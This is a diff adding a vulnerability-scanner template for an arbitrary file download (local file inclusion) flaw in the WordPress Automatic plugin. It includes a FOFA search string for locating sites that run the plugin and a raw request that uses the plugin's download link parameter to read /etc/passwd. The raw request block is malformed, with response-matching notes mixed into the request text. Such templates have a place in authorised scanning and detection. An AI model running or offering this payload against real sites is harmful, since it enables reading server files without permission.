@@ -1,0 +1,46 @@
+id: poc-pw3aixwpg2d56ybc
+info:
+  name: WordPress Automatic Plugin任意文件下载漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pw3aixwpg2d56ybc'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pw3aixwpg2d56ybc
+    fofa: '"/wp-content/plugins/wp-automatic"'
+http:
+- raw:
+  - 'GET /?p=3232&wp_automatic=download&link=file:///etc/passwd HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept: */*
+
+
+    Accept-Language: en
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?root)(?=.*?bin).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
